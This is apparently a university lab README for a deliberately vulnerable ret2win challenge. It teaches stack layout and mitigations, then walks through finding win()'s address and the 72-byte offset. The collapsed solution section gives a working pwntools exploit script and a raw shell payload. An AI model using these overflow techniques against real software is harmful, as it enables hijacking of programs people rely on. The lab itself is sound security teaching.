# Buffer-overflow lab — ret2win

> ### ⚠ Deliberately vulnerable, container-only
> This binary is built with stack protections **off on purpose** (see the
> Dockerfile). It runs inside a throwaway container bound to nothing, and the
> flag is a made-up string. Overflowing it *inside the box* is the exercise.
> Never ship a binary built like this, and only ever practise these techniques
> on software you own or are authorised to test. The week-10 README has the
> full scope/legal note.

`vuln` reads your name into a buffer and greets you. Buried in the binary is a
function `win()` that prints the flag — and `main()` **never calls it**. Your
job is to make the program run `win()` anyway, by overflowing the buffer and
overwriting the address the function returns to.

This is *ret2win*: the "hello world" of binary exploitation (pwn). Once you
have done it, every later pwn technique is a variation on the same move —
control the saved return address, control the program.

---

## Before you start: memory, the stack, and how a call works

To understand *why* an over-long input hands you control, you need three facts
about how a C function runs on x86-64.

**1. The stack.** Each running program has a region of memory called the
**stack**, used for function-call bookkeeping and local variables. It **grows
downward**: each new function call moves the "top" to a *lower* address. Three
CPU **registers** track it:

- `rsp` — **stack pointer**, points at the current top of the stack.
- `rbp` — **base pointer**, a fixed anchor for the current function's frame, so
  locals can be addressed relative to it.
- `rip` — **instruction pointer**, the address of the *next instruction to
  execute*. **Whoever controls `rip` controls the program.** You never write
  `rip` directly — but `ret` does, as you'll see.

**2. What `call` and `ret` do.** When one function calls another, the `call`
instruction **pushes the return address** (where to resume afterwards) onto the
stack, then jumps. When the callee finishes, `ret` **pops that address off the
stack back into `rip`**. So the return address is *just 8 bytes sitting on the
stack* — and the CPU trusts them completely.

**3. A function's stack frame.** On entry a function runs a **prologue**
(`push rbp; mov rbp, rsp`) and reserves space below `rbp` for its locals. So
for `vuln()`, memory looks like this (low address at the left, where `read()`
starts writing; high address at the right):

```
 lower addresses                                         higher addresses
 ┌────────────────────────┬───────────────┬────────────────────────────┐
 │     buf[64]            │ saved RBP (8) │   saved return address (8)  │
 └────────────────────────┴───────────────┴────────────────────────────┘
  ^ read() writes from here, upward →       ^ ret will pop THIS into rip
  └───────────── 64 + 8 = 72 bytes before the return address ───────────┘
```

`buf` sits at the bottom; the saved `rbp` and then the saved return address sit
*above* it. `read(0, buf, 256)` writes starting at `buf` and keeps going
**upward** for as many bytes as you send. Because C **never checks that your
input fits in `buf`**, sending more than 64 bytes runs straight over the saved
`rbp` and into the saved return address. Put the address of `win()` there, and
when `vuln()` hits its `ret`, the CPU pops *your* address into `rip` and
"returns" into `win()` — a function nobody called.

So the payload is: **72 bytes of filler, then the 8-byte address of `win()`**.
Everything below is about finding that `72` and that address, and proving each.

Two mitigations, both switched **off** in this build, make it clean:

- **No stack canary** — normally the compiler plants a secret value just below
  the return address and checks it before `ret`; an overflow would smash it and
  the program would abort. Off here, so nothing notices.
- **No PIE/ASLR** — normally the program loads at a random address each run, so
  `win()` moves. Off here, so `win()` sits at the *same fixed address every
  time* and you can hard-code it.

---

## Build and enter

```bash
cd week-10/buffer-overflow
docker build -t cs440-pwn .
docker run -it --rm cs440-pwn
```

`docker run -it --rm` gives an interactive shell and deletes the container on
exit. You land as `player` in `/home/player` with:

- `vuln` — the challenge binary,
- `src/vuln.c` — **the source is included on purpose**: read it, because
  reading a binary to find exactly this kind of bug is what you practised in
  the reverse-engineering lab,
- `gdb`, `objdump`, `nm`, `file`, and `python3` with **pwntools** (the standard
  CTF exploitation library).

Meet the program:

```bash
./vuln
# == ret2win ==
# There is a win() function in here. main() never calls it.
# What is your name?
# > Alice
# Nice to meet you, Alice
# vuln() returned normally. (If you are reading this, you missed.)
```

A normal name returns normally. Your goal is to make it reach `win()` instead.

---

## Step 1 — confirm the mitigations are off

```bash
pwn checksec vuln
```

`pwn checksec` (a pwntools helper) reads the ELF and reports which hardening
features are compiled in:

```
Stack:    No canary found
PIE:      No PIE (0x400000)
```

- **`No canary found`** → the overflow won't be detected, so overwriting the
  return address is viable (see the canary note above).
- **`No PIE (0x400000)`** → no address randomisation; the program always loads
  at `0x400000`, so every function has a fixed, predictable address. That is
  what lets you hard-code `win()`.

(`checksec` also lists `NX enabled` and `Partial RELRO` — defences we don't
need to defeat here because ret2win reuses *existing* code and never injects
any. With a canary present you'd have to leak it first; with PIE you'd need an
address leak. Both are later labs — turning them off is what makes *this* the
first one.)

## Step 2 — find the address of `win()`

You need the exact address to jump to. Any of these three reads it from the
binary — pick whichever you like, and note they all agree:

```bash
nm vuln | grep ' win$'                 # ->  00000000004011a6 T win
objdump -d vuln | grep '<win>:'        # ->  00000000004011a6 <win>:
gdb -q vuln -ex 'print win' -ex quit   # ->  $1 = {void (void)} 0x4011a6 <win>
```

What each does: `nm` prints the **symbol table** (every name → its address; the
`T` means it's a function in `.text`). `objdump -d` finds where `win`'s
disassembly begins. `gdb`'s `print win` evaluates the symbol like a debugger
would. All report **`0x4011a6`** in this build. Because there is no PIE, that
address is stable across runs — but always read it off *your* binary rather
than trusting a number from a README.

## Step 3 — find the offset to the return address

The picture says 72 (`64` for `buf` + `8` for the saved `rbp`). You should
*prove* it rather than trust the diagram — on a real target you won't know the
buffer size. The standard trick is a **cyclic** (De Bruijn) pattern: a string
in which every 8-byte window is unique, so whichever 8 bytes end up on the
return slot tell you *exactly* how far into your input that slot was.

Write a 200-byte pattern to a file, then run the program under `gdb` with that
file on stdin and let it crash:

```bash
python3 -c "from pwn import *; open('/tmp/pat','wb').write(cyclic(200, n=8))"
gdb -q vuln -ex 'run < /tmp/pat'
```

`vuln()` reaches its `ret`, pops your pattern bytes as the "return address",
and the CPU faults trying to jump to that (non-canonical) address. Here is the
subtle part worth understanding:

> gdb reports the fault **at the `ret` instruction itself** — so `rip` just
> holds the `ret`'s own address, *not* your pattern. The value `ret` tried to
> jump to was popped to the **top of the stack**, so read it from `rsp`:

```text
gdb> x/gx $rsp
0x7fff...cb8:    0x616161616161616a

gdb> quit
```

`x/gx $rsp` means "examine memory: 1 **g**iant (8-byte) word, in he**x**, at the
address in `rsp`." That `0x616161616161616a` is eight of your pattern bytes
(`0x61` is ASCII `a`). Hand it back to pwntools to look up its position:

```bash
python3 -c "from pwn import *; print(cyclic_find(0x616161616161616a, n=8))"
# -> 72
```

`cyclic_find` searches the same De Bruijn sequence for those 8 bytes and
returns how many bytes preceded them — the offset from the start of your input
to the return address.

(For this binary the answer is **72**. The method is the point. The hex value
is your own input bytes landing on the return slot, so it's the same every run;
only the stack *address* on the left changes with ASLR.)

---

<details>
<summary><b>Intended solution</b> — try it yourself first, then open this.</summary>

### The payload

72 bytes of padding, then `win`'s address. x86-64 is **little-endian**, so an
8-byte address is stored with its *lowest* byte first in memory: `0x4011a6`
becomes the bytes `a6 11 40 00 00 00 00 00`. Getting this byte order right is
what the `p64()` helper (and the raw escape below) is for.

### Option A — pwntools (how real CTFs do it)

Create `solve.py` in the container (`vim solve.py`):

```python
from pwn import *

e = ELF("./vuln")                 # parse the binary; e.symbols has win's address
p = process("./vuln")             # launch it, wired up to send/receive

p.recvuntil(b"> ")                # wait for the "> " prompt before sending
p.sendline(b"A" * 72 + p64(e.symbols["win"]))   # 72 filler + win, little-endian

print(p.recvall(timeout=2).decode(errors="replace"))
```

```bash
python3 solve.py
# ...
# [+] Execution reached win(). The flag:
# CS440{you_control_the_program_counter_now}
```

Why pwntools: `ELF()` reads the address so you never type it, `p64()` packs it
little-endian for you, and `recvuntil`/`sendline` handle the prompt timing — the
same scaffolding you'd use against a real remote service.

### Option B — no pwntools, just a shell

Hard-code the address you found in Step 2, written out little-endian by hand
(`0x4011a6` → `\xa6\x11\x40\x00\x00\x00\x00\x00`):

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + b"\xa6\x11\x40\x00\x00\x00\x00\x00")' > payload
./vuln < payload
# [+] Execution reached win(). The flag:
# CS440{you_control_the_program_counter_now}
```

Both do the identical thing: 72 filler bytes, then overwrite the return address
with `&win`. Option A just computes the bytes for you.

</details>

---

## A note on stack alignment (why `win()` uses `write`, not `printf`)

If you write your *own* ret2win challenge, you'll likely hit a confusing crash:
you reach the target function, but it segfaults *inside libc* at a `movaps`
instruction. That's the x86-64 ABI's **16-byte stack-alignment** rule. A normal
`call` leaves the stack 16-byte aligned on entry, but a ret2win enters via a
bare `ret` without that matching `call`, so the stack ends up 8 bytes off, and
the first SSE instruction inside `printf`/`system` faults.

Two standard fixes:

1. **Return through a `ret` gadget first** — put the address of a lone `ret`
   instruction *before* `&win` in the payload. It pops 8 bytes (realigning the
   stack) and falls into `win`. Find one with `objdump -d vuln | grep ret`.
2. **Avoid alignment-sensitive calls in the target** — which is what this lab's
   `win()` does: it prints the flag with raw `write`/`open`/`read` syscalls, so
   the lab "just works" at offset 72 and the lesson stays on the overwrite.

Knowing fix #1 is what graduates you from this lab to real ones.

---

## What this challenge is really teaching

- **C does not check bounds.** `read(0, buf, 256)` into a 64-byte buffer is
  legal C and compiles without a warning. The length came from the *program*,
  not the *data* — and the data was longer.
- **Code and control live in writable memory.** The return address is just 8
  bytes on the stack, a short way above your buffer. Whoever writes those bytes
  chooses the next instruction `rip` executes.
- **Mitigations are why the modern world isn't on fire.** You switched off a
  canary and PIE to make this work; they exist precisely to break this attack.
  The follow-on labs — leak the canary, defeat ASLR, chain existing code with
  ROP — are the story of what attackers did next and what defenders did back.
